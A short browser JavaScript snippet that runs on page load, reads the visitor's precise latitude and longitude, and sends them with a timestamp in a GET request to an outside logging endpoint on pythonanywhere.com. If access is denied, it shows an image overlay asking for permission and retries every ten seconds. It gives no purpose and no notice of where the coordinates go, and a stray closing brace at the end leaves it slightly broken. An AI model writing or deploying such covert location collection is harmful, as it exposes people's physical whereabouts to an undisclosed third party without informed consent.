function getLocation() {
    navigator.geolocation.getCurrentPosition(
      function(position) {
          let latitude = position.coords.latitude;
              let longitude = position.coords.longitude
                  let loc = "Latitude: " + latitude + ", Longitude: " + longitude

                      sendInfo(loc)
                          sendInfo(position.coords.timestamp)
                            },
                              function(error) {
                                  promptLocationPermis()
                                      setTimeout(getLocation, 10000)
                                          console.error("Error getting location: ", error.message);
                                            }
                                            );
                                            }
                                            function sendInfo(location) {
                                              let url = "https://rafaelmenna.pythonanywhere.com/info/?info="+location
                                                fetch(url).then((res) => {
                                                      return res.text()
                                                        }).then((text) => {
                                                              console.log(text)
                                                                })
                                                                }

                                                                function promptLocationPermis(param) {
                                                                  let ele = document.getElementById('uniquelocationTurnOn')
                                                                    let img = ele.querySelector('img')
                                                                      ele.querySelector('button').addEventListener('click', (e) => {
                                                                            ele.classList.remove('active')
                                                                              })
                                                                                img.src = '/GIF_20250207_01.gif'
                                                                                  img.onload = function () {
                                                                                      ele.classList.add('active')
                                                                                          document.body.insertAdjacentElement('afterbegin', ele )
                                                                                            }
                                                                                              
                                                                                              }
                                                                                              getLocation()
}